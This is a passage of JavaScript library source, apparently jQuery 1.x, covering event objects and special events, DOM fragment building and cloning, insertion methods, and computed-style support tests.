                        if (jQuery.nodeName(this, "input") && this.type === "checkbox" && this.click) {
                            this.click();
                            return false
                        }
                    },
                    _default: function(event) {
                        return jQuery.nodeName(event.target, "a")
                    }
                },
                beforeunload: {
                    postDispatch: function(event) {
                        if (event.result !== undefined && event.originalEvent) {
                            event.originalEvent.returnValue = event.result
                        }
                    }
                }
            },
            simulate: function(type, elem, event, bubble) {
                var e = jQuery.extend(new jQuery.Event(), event, {
                    type: type,
                    isSimulated: true,
                    originalEvent: {}
                });
                if (bubble) {
                    jQuery.event.trigger(e, null, elem)
                } else {
                    jQuery.event.dispatch.call(elem, e)
                }
                if (e.isDefaultPrevented()) {
                    event.preventDefault()
                }
            }
        };
        jQuery.removeEvent = document.removeEventListener ? function(elem, type, handle) {
            if (elem.removeEventListener) {
                elem.removeEventListener(type, handle, false)
            }
        } : function(elem, type, handle) {
            var name = "on" + type;
            if (elem.detachEvent) {
                if (typeof elem[name] === strundefined) {
                    elem[name] = null
                }
                elem.detachEvent(name, handle)
            }
        };
        jQuery.Event = function(src, props) {
            if (!(this instanceof jQuery.Event)) {
                return new jQuery.Event(src, props)
            }
            if (src && src.type) {
                this.originalEvent = src;
                this.type = src.type;
                this.isDefaultPrevented = src.defaultPrevented || src.defaultPrevented === undefined && src.returnValue === false ? returnTrue : returnFalse
            } else {
                this.type = src
            }
            if (props) {
                jQuery.extend(this, props)
            }
            this.timeStamp = src && src.timeStamp || jQuery.now();
            this[jQuery.expando] = true
        };
        jQuery.Event.prototype = {
            isDefaultPrevented: returnFalse,
            isPropagationStopped: returnFalse,
            isImmediatePropagationStopped: returnFalse,
            preventDefault: function() {
                var e = this.originalEvent;
                this.isDefaultPrevented = returnTrue;
                if (!e) {
                    return
                }
                if (e.preventDefault) {
                    e.preventDefault()
                } else {
                    e.returnValue = false
                }
            },
            stopPropagation: function() {
                var e = this.originalEvent;
                this.isPropagationStopped = returnTrue;
                if (!e) {
                    return
                }
                if (e.stopPropagation) {
                    e.stopPropagation()
                }
                e.cancelBubble = true
            },
            stopImmediatePropagation: function() {
                var e = this.originalEvent;
                this.isImmediatePropagationStopped = returnTrue;
                if (e && e.stopImmediatePropagation) {
                    e.stopImmediatePropagation()
                }
                this.stopPropagation()
            }
        };
        jQuery.each({
            mouseenter: "mouseover",
            mouseleave: "mouseout",
            pointerenter: "pointerover",
            pointerleave: "pointerout"
        }, function(orig, fix) {
            jQuery.event.special[orig] = {
                delegateType: fix,
                bindType: fix,
                handle: function(event) {
                    var ret, target = this,
                        related = event.relatedTarget,
                        handleObj = event.handleObj;
                    if (!related || (related !== target && !jQuery.contains(target, related))) {
                        event.type = handleObj.origType;
                        ret = handleObj.handler.apply(this, arguments);
                        event.type = fix
                    }
                    return ret
                }
            }
        });
        if (!support.submitBubbles) {
            jQuery.event.special.submit = {
                setup: function() {
                    if (jQuery.nodeName(this, "form")) {
                        return false
                    }
                    jQuery.event.add(this, "click._submit keypress._submit", function(e) {
                        var elem = e.target,
                            form = jQuery.nodeName(elem, "input") || jQuery.nodeName(elem, "button") ? elem.form : undefined;
                        if (form && !jQuery._data(form, "submitBubbles")) {
                            jQuery.event.add(form, "submit._submit", function(event) {
                                event._submit_bubble = true
                            });
                            jQuery._data(form, "submitBubbles", true)
                        }
                    })
                },
                postDispatch: function(event) {
                    if (event._submit_bubble) {
                        delete event._submit_bubble;
                        if (this.parentNode && !event.isTrigger) {
                            jQuery.event.simulate("submit", this.parentNode, event, true)
                        }
                    }
                },
                teardown: function() {
                    if (jQuery.nodeName(this, "form")) {
                        return false
                    }
                    jQuery.event.remove(this, "._submit")
                }
            }
        }
        if (!support.changeBubbles) {
            jQuery.event.special.change = {
                setup: function() {
                    if (rformElems.test(this.nodeName)) {
                        if (this.type === "checkbox" || this.type === "radio") {
                            jQuery.event.add(this, "propertychange._change", function(event) {
                                if (event.originalEvent.propertyName === "checked") {
                                    this._just_changed = true
                                }
                            });
                            jQuery.event.add(this, "click._change", function(event) {
                                if (this._just_changed && !event.isTrigger) {
                                    this._just_changed = false
                                }
                                jQuery.event.simulate("change", this, event, true)
                            })
                        }
                        return false
                    }
                    jQuery.event.add(this, "beforeactivate._change", function(e) {
                        var elem = e.target;
                        if (rformElems.test(elem.nodeName) && !jQuery._data(elem, "changeBubbles")) {
                            jQuery.event.add(elem, "change._change", function(event) {
                                if (this.parentNode && !event.isSimulated && !event.isTrigger) {
                                    jQuery.event.simulate("change", this.parentNode, event, true)
                                }
                            });
                            jQuery._data(elem, "changeBubbles", true)
                        }
                    })
                },
                handle: function(event) {
                    var elem = event.target;
                    if (this !== elem || event.isSimulated || event.isTrigger || (elem.type !== "radio" && elem.type !== "checkbox")) {
                        return event.handleObj.handler.apply(this, arguments)
                    }
                },
                teardown: function() {
                    jQuery.event.remove(this, "._change");
                    return !rformElems.test(this.nodeName)
                }
            }
        }
        if (!support.focusinBubbles) {
            jQuery.each({
                focus: "focusin",
                blur: "focusout"
            }, function(orig, fix) {
                var handler = function(event) {
                    jQuery.event.simulate(fix, event.target, jQuery.event.fix(event), true)
                };
                jQuery.event.special[fix] = {
                    setup: function() {
                        var doc = this.ownerDocument || this,
                            attaches = jQuery._data(doc, fix);
                        if (!attaches) {
                            doc.addEventListener(orig, handler, true)
                        }
                        jQuery._data(doc, fix, (attaches || 0) + 1)
                    },
                    teardown: function() {
                        var doc = this.ownerDocument || this,
                            attaches = jQuery._data(doc, fix) - 1;
                        if (!attaches) {
                            doc.removeEventListener(orig, handler, true);
                            jQuery._removeData(doc, fix)
                        } else {
                            jQuery._data(doc, fix, attaches)
                        }
                    }
                }
            })
        }
        jQuery.fn.extend({
            on: function(types, selector, data, fn, one) {
                var type, origFn;
                if (typeof types === "object") {
                    if (typeof selector !== "string") {
                        data = data || selector;
                        selector = undefined
                    }
                    for (type in types) {
                        this.on(type, selector, data, types[type], one)
                    }
                    return this
                }
                if (data == null && fn == null) {
                    fn = selector;
                    data = selector = undefined
                } else if (fn == null) {
                    if (typeof selector === "string") {
                        fn = data;
                        data = undefined
                    } else {
                        fn = data;
                        data = selector;
                        selector = undefined
                    }
                }
                if (fn === false) {
                    fn = returnFalse
                } else if (!fn) {
                    return this
                }
                if (one === 1) {
                    origFn = fn;
                    fn = function(event) {
                        jQuery().off(event);
                        return origFn.apply(this, arguments)
                    };
                    fn.guid = origFn.guid || (origFn.guid = jQuery.guid++)
                }
                return this.each(function() {
                    jQuery.event.add(this, types, fn, data, selector)
                })
            },
            one: function(types, selector, data, fn) {
                return this.on(types, selector, data, fn, 1)
            },
            off: function(types, selector, fn) {
                var handleObj, type;
                if (types && types.preventDefault && types.handleObj) {
                    handleObj = types.handleObj;
                    jQuery(types.delegateTarget).off(handleObj.namespace ? handleObj.origType + "." + handleObj.namespace : handleObj.origType, handleObj.selector, handleObj.handler);
                    return this
                }
                if (typeof types === "object") {
                    for (type in types) {
                        this.off(type, selector, types[type])
                    }
                    return this
                }
                if (selector === false || typeof selector === "function") {
                    fn = selector;
                    selector = undefined
                }
                if (fn === false) {
                    fn = returnFalse
                }
                return this.each(function() {
                    jQuery.event.remove(this, types, fn, selector)
                })
            },
            trigger: function(type, data) {
                return this.each(function() {
                    jQuery.event.trigger(type, data, this)
                })
            },
            triggerHandler: function(type, data) {
                var elem = this[0];
                if (elem) {
                    return jQuery.event.trigger(type, data, elem, true)
                }
            }
        });

        function createSafeFragment(document) {
            var list = nodeNames.split("|"),
                safeFrag = document.createDocumentFragment();
            if (safeFrag.createElement) {
                while (list.length) {
                    safeFrag.createElement(list.pop())
                }
            }
            return safeFrag
        }
        var nodeNames = "abbr|article|aside|audio|bdi|canvas|data|datalist|details|figcaption|figure|footer|" + "header|hgroup|mark|meter|nav|output|progress|section|summary|time|video",
            rinlinejQuery = / jQuery\d+="(?:null|\d+)"/g,
            rnoshimcache = new RegExp("<(?:" + nodeNames + ")[\\s/>]", "i"),
            rleadingWhitespace = /^\s+/,
            rxhtmlTag = /<(?!area|br|col|embed|hr|img|input|link|meta|param)(([\w:]+)[^>]*)\/>/gi,
            rtagName = /<([\w:]+)/,
            rtbody = /<tbody/i,
            rhtml = /<|&#?\w+;/,
            rnoInnerhtml = /<(?:script|style|link)/i,
            rchecked = /checked\s*(?:[^=]|=\s*.checked.)/i,
            rscriptType = /^$|\/(?:java|ecma)script/i,
            rscriptTypeMasked = /^true\/(.*)/,
            rcleanScript = /^\s*<!(?:\[CDATA\[|--)|(?:\]\]|--)>\s*$/g,
            wrapMap = {
                option: [1, "<select multiple='multiple'>", "</select>"],
                legend: [1, "<fieldset>", "</fieldset>"],
                area: [1, "<map>", "</map>"],
                param: [1, "<object>", "</object>"],
                thead: [1, "<table>", "</table>"],
                tr: [2, "<table><tbody>", "</tbody></table>"],
                col: [2, "<table><tbody></tbody><colgroup>", "</colgroup></table>"],
                td: [3, "<table><tbody><tr>", "</tr></tbody></table>"],
                _default: support.htmlSerialize ? [0, "", ""] : [1, "X<div>", "</div>"]
            },
            safeFragment = createSafeFragment(document),
            fragmentDiv = safeFragment.appendChild(document.createElement("div"));
        wrapMap.optgroup = wrapMap.option;
        wrapMap.tbody = wrapMap.tfoot = wrapMap.colgroup = wrapMap.caption = wrapMap.thead;
        wrapMap.th = wrapMap.td;

        function getAll(context, tag) {
            var elems, elem, i = 0,
                found = typeof context.getElementsByTagName !== strundefined ? context.getElementsByTagName(tag || "*") : typeof context.querySelectorAll !== strundefined ? context.querySelectorAll(tag || "*") : undefined;
            if (!found) {
                for (found = [], elems = context.childNodes || context;
                    (elem = elems[i]) != null; i++) {
                    if (!tag || jQuery.nodeName(elem, tag)) {
                        found.push(elem)
                    } else {
                        jQuery.merge(found, getAll(elem, tag))
                    }
                }
            }
            return tag === undefined || tag && jQuery.nodeName(context, tag) ? jQuery.merge([context], found) : found
        }

        function fixDefaultChecked(elem) {
            if (rcheckableType.test(elem.type)) {
                elem.defaultChecked = elem.checked
            }
        }

        function manipulationTarget(elem, content) {
            return jQuery.nodeName(elem, "table") && jQuery.nodeName(content.nodeType !== 11 ? content : content.firstChild, "tr") ? elem.getElementsByTagName("tbody")[0] || elem.appendChild(elem.ownerDocument.createElement("tbody")) : elem
        }

        function disableScript(elem) {
            elem.type = (jQuery.find.attr(elem, "type") !== null) + "/" + elem.type;
            return elem
        }

        function restoreScript(elem) {
            var match = rscriptTypeMasked.exec(elem.type);
            if (match) {
                elem.type = match[1]
            } else {
                elem.removeAttribute("type")
            }
            return elem
        }

        function setGlobalEval(elems, refElements) {
            var elem, i = 0;
            for (;
                (elem = elems[i]) != null; i++) {
                jQuery._data(elem, "globalEval", !refElements || jQuery._data(refElements[i], "globalEval"))
            }
        }

        function cloneCopyEvent(src, dest) {
            if (dest.nodeType !== 1 || !jQuery.hasData(src)) {
                return
            }
            var type, i, l, oldData = jQuery._data(src),
                curData = jQuery._data(dest, oldData),
                events = oldData.events;
            if (events) {
                delete curData.handle;
                curData.events = {};
                for (type in events) {
                    for (i = 0, l = events[type].length; i < l; i++) {
                        jQuery.event.add(dest, type, events[type][i])
                    }
                }
            }
            if (curData.data) {
                curData.data = jQuery.extend({}, curData.data)
            }
        }

        function fixCloneNodeIssues(src, dest) {
            var nodeName, e, data;
            if (dest.nodeType !== 1) {
                return
            }
            nodeName = dest.nodeName.toLowerCase();
            if (!support.noCloneEvent && dest[jQuery.expando]) {
                data = jQuery._data(dest);
                for (e in data.events) {
                    jQuery.removeEvent(dest, e, data.handle)
                }
                dest.removeAttribute(jQuery.expando)
            }
            if (nodeName === "script" && dest.text !== src.text) {
                disableScript(dest).text = src.text;
                restoreScript(dest)
            } else if (nodeName === "object") {
                if (dest.parentNode) {
                    dest.outerHTML = src.outerHTML
                }
                if (support.html5Clone && (src.innerHTML && !jQuery.trim(dest.innerHTML))) {
                    dest.innerHTML = src.innerHTML
                }
            } else if (nodeName === "input" && rcheckableType.test(src.type)) {
                dest.defaultChecked = dest.checked = src.checked;
                if (dest.value !== src.value) {
                    dest.value = src.value
                }
            } else if (nodeName === "option") {
                dest.defaultSelected = dest.selected = src.defaultSelected
            } else if (nodeName === "input" || nodeName === "textarea") {
                dest.defaultValue = src.defaultValue
            }
        }
        jQuery.extend({
            clone: function(elem, dataAndEvents, deepDataAndEvents) {
                var destElements, node, clone, i, srcElements, inPage = jQuery.contains(elem.ownerDocument, elem);
                if (support.html5Clone || jQuery.isXMLDoc(elem) || !rnoshimcache.test("<" + elem.nodeName + ">")) {
                    clone = elem.cloneNode(true)
                } else {
                    fragmentDiv.innerHTML = elem.outerHTML;
                    fragmentDiv.removeChild(clone = fragmentDiv.firstChild)
                }
                if ((!support.noCloneEvent || !support.noCloneChecked) && (elem.nodeType === 1 || elem.nodeType === 11) && !jQuery.isXMLDoc(elem)) {
                    destElements = getAll(clone);
                    srcElements = getAll(elem);
                    for (i = 0;
                        (node = srcElements[i]) != null; ++i) {
                        if (destElements[i]) {
                            fixCloneNodeIssues(node, destElements[i])
                        }
                    }
                }
                if (dataAndEvents) {
                    if (deepDataAndEvents) {
                        srcElements = srcElements || getAll(elem);
                        destElements = destElements || getAll(clone);
                        for (i = 0;
                            (node = srcElements[i]) != null; i++) {
                            cloneCopyEvent(node, destElements[i])
                        }
                    } else {
                        cloneCopyEvent(elem, clone)
                    }
                }
                destElements = getAll(clone, "script");
                if (destElements.length > 0) {
                    setGlobalEval(destElements, !inPage && getAll(elem, "script"))
                }
                destElements = srcElements = node = null;
                return clone
            },
            buildFragment: function(elems, context, scripts, selection) {
                var j, elem, contains, tmp, tag, tbody, wrap, l = elems.length,
                    safe = createSafeFragment(context),
                    nodes = [],
                    i = 0;
                for (; i < l; i++) {
                    elem = elems[i];
                    if (elem || elem === 0) {
                        if (jQuery.type(elem) === "object") {
                            jQuery.merge(nodes, elem.nodeType ? [elem] : elem)
                        } else if (!rhtml.test(elem)) {
                            nodes.push(context.createTextNode(elem))
                        } else {
                            tmp = tmp || safe.appendChild(context.createElement("div"));
                            tag = (rtagName.exec(elem) || ["", ""])[1].toLowerCase();
                            wrap = wrapMap[tag] || wrapMap._default;
                            tmp.innerHTML = wrap[1] + elem.replace(rxhtmlTag, "<$1></$2>") + wrap[2];
                            j = wrap[0];
                            while (j--) {
                                tmp = tmp.lastChild
                            }
                            if (!support.leadingWhitespace && rleadingWhitespace.test(elem)) {
                                nodes.push(context.createTextNode(rleadingWhitespace.exec(elem)[0]))
                            }
                            if (!support.tbody) {
                                elem = tag === "table" && !rtbody.test(elem) ? tmp.firstChild : wrap[1] === "<table>" && !rtbody.test(elem) ? tmp : 0;
                                j = elem && elem.childNodes.length;
                                while (j--) {
                                    if (jQuery.nodeName((tbody = elem.childNodes[j]), "tbody") && !tbody.childNodes.length) {
                                        elem.removeChild(tbody)
                                    }
                                }
                            }
                            jQuery.merge(nodes, tmp.childNodes);
                            tmp.textContent = "";
                            while (tmp.firstChild) {
                                tmp.removeChild(tmp.firstChild)
                            }
                            tmp = safe.lastChild
                        }
                    }
                }
                if (tmp) {
                    safe.removeChild(tmp)
                }
                if (!support.appendChecked) {
                    jQuery.grep(getAll(nodes, "input"), fixDefaultChecked)
                }
                i = 0;
                while ((elem = nodes[i++])) {
                    if (selection && jQuery.inArray(elem, selection) !== -1) {
                        continue
                    }
                    contains = jQuery.contains(elem.ownerDocument, elem);
                    tmp = getAll(safe.appendChild(elem), "script");
                    if (contains) {
                        setGlobalEval(tmp)
                    }
                    if (scripts) {
                        j = 0;
                        while ((elem = tmp[j++])) {
                            if (rscriptType.test(elem.type || "")) {
                                scripts.push(elem)
                            }
                        }
                    }
                }
                tmp = null;
                return safe
            },
            cleanData: function(elems, acceptData) {
                var elem, type, id, data, i = 0,
                    internalKey = jQuery.expando,
                    cache = jQuery.cache,
                    deleteExpando = support.deleteExpando,
                    special = jQuery.event.special;
                for (;
                    (elem = elems[i]) != null; i++) {
                    if (acceptData || jQuery.acceptData(elem)) {
                        id = elem[internalKey];
                        data = id && cache[id];
                        if (data) {
                            if (data.events) {
                                for (type in data.events) {
                                    if (special[type]) {
                                        jQuery.event.remove(elem, type)
                                    } else {
                                        jQuery.removeEvent(elem, type, data.handle)
                                    }
                                }
                            }
                            if (cache[id]) {
                                delete cache[id];
                                if (deleteExpando) {
                                    delete elem[internalKey]
                                } else if (typeof elem.removeAttribute !== strundefined) {
                                    elem.removeAttribute(internalKey)
                                } else {
                                    elem[internalKey] = null
                                }
                                deletedIds.push(id)
                            }
                        }
                    }
                }
            }
        });
        jQuery.fn.extend({
            text: function(value) {
                return access(this, function(value) {
                    return value === undefined ? jQuery.text(this) : this.empty().append((this[0] && this[0].ownerDocument || document).createTextNode(value))
                }, null, value, arguments.length)
            },
            append: function() {
                return this.domManip(arguments, function(elem) {
                    if (this.nodeType === 1 || this.nodeType === 11 || this.nodeType === 9) {
                        var target = manipulationTarget(this, elem);
                        target.appendChild(elem)
                    }
                })
            },
            prepend: function() {
                return this.domManip(arguments, function(elem) {
                    if (this.nodeType === 1 || this.nodeType === 11 || this.nodeType === 9) {
                        var target = manipulationTarget(this, elem);
                        target.insertBefore(elem, target.firstChild)
                    }
                })
            },
            before: function() {
                return this.domManip(arguments, function(elem) {
                    if (this.parentNode) {
                        this.parentNode.insertBefore(elem, this)
                    }
                })
            },
            after: function() {
                return this.domManip(arguments, function(elem) {
                    if (this.parentNode) {
                        this.parentNode.insertBefore(elem, this.nextSibling)
                    }
                })
            },
            remove: function(selector, keepData) {
                var elem, elems = selector ? jQuery.filter(selector, this) : this,
                    i = 0;
                for (;
                    (elem = elems[i]) != null; i++) {
                    if (!keepData && elem.nodeType === 1) {
                        jQuery.cleanData(getAll(elem))
                    }
                    if (elem.parentNode) {
                        if (keepData && jQuery.contains(elem.ownerDocument, elem)) {
                            setGlobalEval(getAll(elem, "script"))
                        }
                        elem.parentNode.removeChild(elem)
                    }
                }
                return this
            },
            empty: function() {
                var elem, i = 0;
                for (;
                    (elem = this[i]) != null; i++) {
                    if (elem.nodeType === 1) {
                        jQuery.cleanData(getAll(elem, false))
                    }
                    while (elem.firstChild) {
                        elem.removeChild(elem.firstChild)
                    }
                    if (elem.options && jQuery.nodeName(elem, "select")) {
                        elem.options.length = 0
                    }
                }
                return this
            },
            clone: function(dataAndEvents, deepDataAndEvents) {
                dataAndEvents = dataAndEvents == null ? false : dataAndEvents;
                deepDataAndEvents = deepDataAndEvents == null ? dataAndEvents : deepDataAndEvents;
                return this.map(function() {
                    return jQuery.clone(this, dataAndEvents, deepDataAndEvents)
                })
            },
            html: function(value) {
                return access(this, function(value) {
                    var elem = this[0] || {},
                        i = 0,
                        l = this.length;
                    if (value === undefined) {
                        return elem.nodeType === 1 ? elem.innerHTML.replace(rinlinejQuery, "") : undefined
                    }
                    if (typeof value === "string" && !rnoInnerhtml.test(value) && (support.htmlSerialize || !rnoshimcache.test(value)) && (support.leadingWhitespace || !rleadingWhitespace.test(value)) && !wrapMap[(rtagName.exec(value) || ["", ""])[1].toLowerCase()]) {
                        value = value.replace(rxhtmlTag, "<$1></$2>");
                        try {
                            for (; i < l; i++) {
                                elem = this[i] || {};
                                if (elem.nodeType === 1) {
                                    jQuery.cleanData(getAll(elem, false));
                                    elem.innerHTML = value
                                }
                            }
                            elem = 0
                        } catch (e) {}
                    }
                    if (elem) {
                        this.empty().append(value)
                    }
                }, null, value, arguments.length)
            },
            replaceWith: function() {
                var arg = arguments[0];
                this.domManip(arguments, function(elem) {
                    arg = this.parentNode;
                    jQuery.cleanData(getAll(this));
                    if (arg) {
                        arg.replaceChild(elem, this)
                    }
                });
                return arg && (arg.length || arg.nodeType) ? this : this.remove()
            },
            detach: function(selector) {
                return this.remove(selector, true)
            },
            domManip: function(args, callback) {
                args = concat.apply([], args);
                var first, node, hasScripts, scripts, doc, fragment, i = 0,
                    l = this.length,
                    set = this,
                    iNoClone = l - 1,
                    value = args[0],
                    isFunction = jQuery.isFunction(value);
                if (isFunction || (l > 1 && typeof value === "string" && !support.checkClone && rchecked.test(value))) {
                    return this.each(function(index) {
                        var self = set.eq(index);
                        if (isFunction) {
                            args[0] = value.call(this, index, self.html())
                        }
                        self.domManip(args, callback)
                    })
                }
                if (l) {
                    fragment = jQuery.buildFragment(args, this[0].ownerDocument, false, this);
                    first = fragment.firstChild;
                    if (fragment.childNodes.length === 1) {
                        fragment = first
                    }
                    if (first) {
                        scripts = jQuery.map(getAll(fragment, "script"), disableScript);
                        hasScripts = scripts.length;
                        for (; i < l; i++) {
                            node = fragment;
                            if (i !== iNoClone) {
                                node = jQuery.clone(node, true, true);
                                if (hasScripts) {
                                    jQuery.merge(scripts, getAll(node, "script"))
                                }
                            }
                            callback.call(this[i], node, i)
                        }
                        if (hasScripts) {
                            doc = scripts[scripts.length - 1].ownerDocument;
                            jQuery.map(scripts, restoreScript);
                            for (i = 0; i < hasScripts; i++) {
                                node = scripts[i];
                                if (rscriptType.test(node.type || "") && !jQuery._data(node, "globalEval") && jQuery.contains(doc, node)) {
                                    if (node.src) {
                                        if (jQuery._evalUrl) {
                                            jQuery._evalUrl(node.src)
                                        }
                                    } else {
                                        jQuery.globalEval((node.text || node.textContent || node.innerHTML || "").replace(rcleanScript, ""))
                                    }
                                }
                            }
                        }
                        fragment = first = null
                    }
                }
                return this
            }
        });
        jQuery.each({
            appendTo: "append",
            prependTo: "prepend",
            insertBefore: "before",
            insertAfter: "after",
            replaceAll: "replaceWith"
        }, function(name, original) {
            jQuery.fn[name] = function(selector) {
                var elems, i = 0,
                    ret = [],
                    insert = jQuery(selector),
                    last = insert.length - 1;
                for (; i <= last; i++) {
                    elems = i === last ? this : this.clone(true);
                    jQuery(insert[i])[original](elems);
                    push.apply(ret, elems.get())
                }
                return this.pushStack(ret)
            }
        });
        var iframe, elemdisplay = {};

        function actualDisplay(name, doc) {
            var style, elem = jQuery(doc.createElement(name)).appendTo(doc.body),
                display = window.getDefaultComputedStyle && (style = window.getDefaultComputedStyle(elem[0])) ? style.display : jQuery.css(elem[0], "display");
            elem.detach();
            return display
        }

        function defaultDisplay(nodeName) {
            var doc = document,
                display = elemdisplay[nodeName];
            if (!display) {
                display = actualDisplay(nodeName, doc);
                if (display === "none" || !display) {
                    iframe = (iframe || jQuery("<iframe frameborder='0' width='0' height='0'/>")).appendTo(doc.documentElement);
                    doc = (iframe[0].contentWindow || iframe[0].contentDocument).document;
                    doc.write();
                    doc.close();
                    display = actualDisplay(nodeName, doc);
                    iframe.detach()
                }
                elemdisplay[nodeName] = display
            }
            return display
        }(function() {
            var shrinkWrapBlocksVal;
            support.shrinkWrapBlocks = function() {
                if (shrinkWrapBlocksVal != null) {
                    return shrinkWrapBlocksVal
                }
                shrinkWrapBlocksVal = false;
                var div, body, container;
                body = document.getElementsByTagName("body")[0];
                if (!body || !body.style) {
                    return
                }
                div = document.createElement("div");
                container = document.createElement("div");
                container.style.cssText = "position:absolute;border:0;width:0;height:0;top:0;left:-9999px";
                body.appendChild(container).appendChild(div);
                if (typeof div.style.zoom !== strundefined) {
                    div.style.cssText = "-webkit-box-sizing:content-box;-moz-box-sizing:content-box;" + "box-sizing:content-box;display:block;margin:0;border:0;" + "padding:1px;width:1px;zoom:1";
                    div.appendChild(document.createElement("div")).style.width = "5px";
                    shrinkWrapBlocksVal = div.offsetWidth !== 3
                }
                body.removeChild(container);
                return shrinkWrapBlocksVal
            }
        })();
        var rmargin = (/^margin/);
        var rnumnonpx = new RegExp("^(" + pnum + ")(?!px)[a-z%]+$", "i");
        var getStyles, curCSS, rposition = /^(top|right|bottom|left)$/;
        if (window.getComputedStyle) {
            getStyles = function(elem) {
                if (elem.ownerDocument.defaultView.opener) {
                    return elem.ownerDocument.defaultView.getComputedStyle(elem, null)
                }
                return window.getComputedStyle(elem, null)
            };
            curCSS = function(elem, name, computed) {
                var width, minWidth, maxWidth, ret, style = elem.style;
                computed = computed || getStyles(elem);
                ret = computed ? computed.getPropertyValue(name) || computed[name] : undefined;
                if (computed) {
                    if (ret === "" && !jQuery.contains(elem.ownerDocument, elem)) {
                        ret = jQuery.style(elem, name)
                    }
                    if (rnumnonpx.test(ret) && rmargin.test(name)) {
                        width = style.width;
                        minWidth = style.minWidth;
                        maxWidth = style.maxWidth;
                        style.minWidth = style.maxWidth = style.width = ret;
                        ret = computed.width;
                        style.width = width;
                        style.minWidth = minWidth;
                        style.maxWidth = maxWidth
                    }
                }
                return ret === undefined ? ret : ret + ""
            }
        } else if (document.documentElement.currentStyle) {
            getStyles = function(elem) {
                return elem.currentStyle
            };
            curCSS = function(elem, name, computed) {
                var left, rs, rsLeft, ret, style = elem.style;
                computed = computed || getStyles(elem);
                ret = computed ? computed[name] : undefined;
                if (ret == null && style && style[name]) {
                    ret = style[name]
                }
                if (rnumnonpx.test(ret) && !rposition.test(name)) {
                    left = style.left;
                    rs = elem.runtimeStyle;
                    rsLeft = rs && rs.left;
                    if (rsLeft) {
                        rs.left = elem.currentStyle.left
                    }
                    style.left = name === "fontSize" ? "1em" : ret;
                    ret = style.pixelLeft + "px";
                    style.left = left;
                    if (rsLeft) {
                        rs.left = rsLeft
                    }
                }
                return ret === undefined ? ret : ret + "" || "auto"
            }
        }

        function addGetHookIf(conditionFn, hookFn) {
            return {
                get: function() {
                    var condition = conditionFn();
                    if (condition == null) {
                        return
                    }
                    if (condition) {
                        delete this.get;
                        return
                    }
                    return (this.get = hookFn).apply(this, arguments)
                }
            }
        }(function() {
            var div, style, a, pixelPositionVal, boxSizingReliableVal, reliableHiddenOffsetsVal, reliableMarginRightVal;
            div = document.createElement("div");
            div.innerHTML = "  <link/><table></table><a href='/a'>a</a><input type='checkbox'/>";
            a = div.getElementsByTagName("a")[0];
            style = a && a.style;
            if (!style) {
                return
            }
            style.cssText = "float:left;opacity:.5";
            support.opacity = style.opacity === "0.5";
            support.cssFloat = !!style.cssFloat;
            div.style.backgroundClip = "content-box";
            div.cloneNode(true).style.backgroundClip = "";
            support.clearCloneStyle = div.style.backgroundClip === "content-box";
            support.boxSizing = style.boxSizing === "" || style.MozBoxSizing === "" || style.WebkitBoxSizing === "";
            jQuery.extend(support, {
                reliableHiddenOffsets: function() {
                    if (reliableHiddenOffsetsVal == null) {
                        computeStyleTests()
                    }
                    return reliableHiddenOffsetsVal
                },
                boxSizingReliable: function() {
                    if (boxSizingReliableVal == null) {
                        computeStyleTests()
                    }
                    return boxSizingReliableVal
                },
                pixelPosition: function() {
                    if (pixelPositionVal == null) {
                        computeStyleTests()
                    }
                    return pixelPositionVal
                },
                reliableMarginRight: function() {
                    if (reliableMarginRightVal == null) {
                        computeStyleTests()
                    }
                    return reliableMarginRightVal
                }
            });

            function computeStyleTests() {
                var div, body, container, contents;
                body = document.getElementsByTagName("body")[0];
                if (!body || !body.style) {
                    return
                }
                div = document.createElement("div");
                container = document.createElement("div");
                container.style.cssText = "position:absolute;border:0;width:0;height:0;top:0;left:-9999px";
                body.appendChild(container).appendChild(div);
                div.style.cssText = "-webkit-box-sizing:border-box;-moz-box-sizing:border-box;" + "box-sizing:border-box;display:block;margin-top:1%;top:1%;" + "border:1px;padding:1px;width:4px;position:absolute";
                pixelPositionVal = boxSizingReliableVal = false;
                reliableMarginRightVal = true;
                if (window.getComputedStyle) {
                    pixelPositionVal = (window.getComputedStyle(div, null) || {}).top !== "1%";
                    boxSizingReliableVal = (window.getComputedStyle(div, null) || {
                        width: "4px"
                    }).width === "4px";
                    contents = div.appendChild(document.createElement("div"));
                    contents.style.cssText = div.style.cssText = "-webkit-box-sizing:content-box;-moz-box-sizing:content-box;" + "box-sizing:content-box;display:block;margin:0;border:0;padding:0";
                    contents.style.marginRight = contents.style.width = "0";
                    div.style.width = "1px";
                    reliableMarginRightVal = !parseFloat((window.getComputedStyle(contents, null) || {}).marginRight);
                    div.removeChild(contents)
                }
                div.innerHTML = "<table><tr><td></td><td>t</td></tr></table>";
                contents = div.getElementsByTagName("td");
                contents[0].style.cssText = "margin:0;border:0;padding:0;display:none";
                reliableHiddenOffsetsVal = contents[0].offsetHeight === 0;
                if (reliableHiddenOffsetsVal) {
                    contents[0].style.display = "";
                    contents[1].style.display = "none";
                    reliableHiddenOffsetsVal = contents[0].offsetHeight === 0
                }
                body.removeChild(container)
            }
        })();
        jQuery.swap = function(elem, options, callback, args) {
            var ret, name, old = {};
            for (name in options) {
                old[name] = elem.style[name];
                elem.style[name] = options[name]
            }
            ret = callback.apply(elem, args || []);
            for (name in options) {
                elem.style[name] = old[name]
            }
            return ret
        };
        var ralpha = /alpha\([^)]*\)/i,
            ropacity = /opacity\s*=\s*([^)]*)/,
            rdisplayswap = /^(none|table(?!-c[ea]).+)/,
            rnumsplit = new RegExp("^(" + pnum + ")(.*)$", "i"),
            rrelNum = new RegExp("^([+-])=(" + pnum + ")", "i"),
            cssShow = {
                position: "absolute",
                visibility: "hidden",
                display: "block"
            },
            cssNormalTransform = {
                letterSpacing: "0",
                fontWeight: "400"
            },
            cssPrefixes = ["Webkit", "O", "Moz", "ms"];

        function vendorPropName(style, name) {
            if (name in style) {
                return name
            }
            var capName = name.charAt(0).toUpperCase() + name.slice(1),
                origName = name,
                i = cssPrefixes.length;
            while (i--) {
                name = cssPrefixes[i] + capName;
                if (name in style) {
                    return name
                }
            }
            return origName
        }

        function showHide(elements, show) {
            var display, elem, hidden, values = [],
                index = 0,
                length = elements.length;
            for (; index < length; index++) {
                elem = elements[index];
                if (!elem.style) {
                    continue
                }
                values[index] = jQuery._data(elem, "olddisplay");
                display = elem.style.display;
                if (show) {
                    if (!values[index] && display === "none") {
                        elem.style.display = ""
                    }
                    if (elem.style.display === "" && isHidden(elem)) {
                        values[index] = jQuery._data(elem, "olddisplay", defaultDisplay(elem.nodeName))
                    }
                } else {
                    hidden = isHidden(elem);
